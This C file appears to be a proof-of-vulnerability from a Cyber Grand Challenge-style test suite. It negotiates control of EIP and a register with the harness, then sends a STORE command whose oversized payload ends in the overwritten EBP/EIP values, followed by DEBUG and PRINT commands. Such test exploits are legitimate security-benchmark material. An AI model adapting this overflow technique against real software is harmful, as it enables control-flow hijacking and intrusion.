#include <libpov.h>

unsigned short swap16(unsigned short n)
{
    return (n << 8) | (n >> 8);
}

int main(void) {

    type1_vals t1;
    type1_negotiate(0x2f2f2f2f, 0x2f2f2f2f, 5, &t1);
    //0..7 [eax,ecx,edx,ebx,esp,ebp,esi,edi]

    int i;
    unsigned char payload[22870], out[8192];
    unsigned char *eip = NULL, *ebp = NULL;
    unsigned int eip_len = 4, ebp_len = 4;
    unsigned int p_len = 0, p_len_b = 0;

    unsigned long long CMD_STORE = 0x4414803BA52CB50DULL;
    unsigned long long CMD_DEBUG = 0x7B7947D03E5DF85DULL;
    unsigned long long CMD_PRINT = 0xEDB20325B2A3505BULL;

    eip = (unsigned char *) &t1.ipval;
    ebp = (unsigned char *) &t1.regval;

    for (i = 0; i < ebp_len; ++i)
    {
        if (ebp[i] == 0x00 || ebp[i] == 0x20)
            ebp[i] |= 0x50;
        else
            ebp[i] |= 0x40;
    }
    for (i = 0; i < eip_len; ++i)
    {
        if (eip[i] == 0x00 || eip[i] == 0x20)
            eip[i] |= 0x50;
        else
            eip[i] |= 0x40;
    }

    transmit_all(STDOUT, "5678", 4); //dummy

    /* STORE */
    payload[p_len++] = 0xA5;
    payload[p_len++] = 1;
    payload[p_len++] = 0x83;
    memcpy(&payload[p_len], "HAX", 3);
    p_len += 3;
    payload[p_len++] = 0xA3;
    *(unsigned short *)&payload[p_len] = swap16(21866);
    p_len += 2;
    random(&payload[p_len], 21845, NULL);
    for (i = 0; i < 21845; ++i)
        payload[p_len + i] &= 0x2F;
    p_len += 21845;
    for (i = 0; i < 13; ++i)
        payload[p_len + i] = i + 'A';
    p_len += 13;
    for (i = 0; i < ebp_len; ++i)
        payload[p_len + i] = ebp[i];
    p_len += ebp_len;
    for (i = 0; i < eip_len; ++i)
        payload[p_len + i] = eip[i];
    p_len += eip_len;
    transmit_all(STDOUT, &CMD_STORE, 8);
    transmit_all(STDOUT, &p_len, 4);
    transmit_all(STDOUT, payload, p_len);
    length_read(STDIN, out, 14);

    /* DEBUG */
    p_len = 0;
    payload[p_len++] = 0xA4;
    payload[p_len++] = 2;
    payload[p_len++] = 0xA2;
    payload[p_len++] = 0xA3;
    *(unsigned short *)&payload[p_len] = swap16(20);
    p_len += 2;
    memcpy(&payload[p_len], "\x13\xbem\x9b\x83s\x9d\x07\xcak\xcc\xee@k\x7f\xe1\xec\x03\xa7\x37", 20);
    p_len += 20;
    transmit_all(STDOUT, &CMD_DEBUG, 8);
    transmit_all(STDOUT, &p_len, 4);
    transmit_all(STDOUT, payload, p_len);
    length_read(STDIN, out, 9);

    /* PRINT */
    p_len = 0;
    payload[p_len++] = 0xC3;
    *(unsigned long long *)&payload[p_len] = 0;
    p_len += 8;
    transmit_all(STDOUT, &CMD_PRINT, 8);
    transmit_all(STDOUT, &p_len, 4);
    transmit_all(STDOUT, payload, p_len);
    length_read(STDIN, out, 10);

    return 0;
}
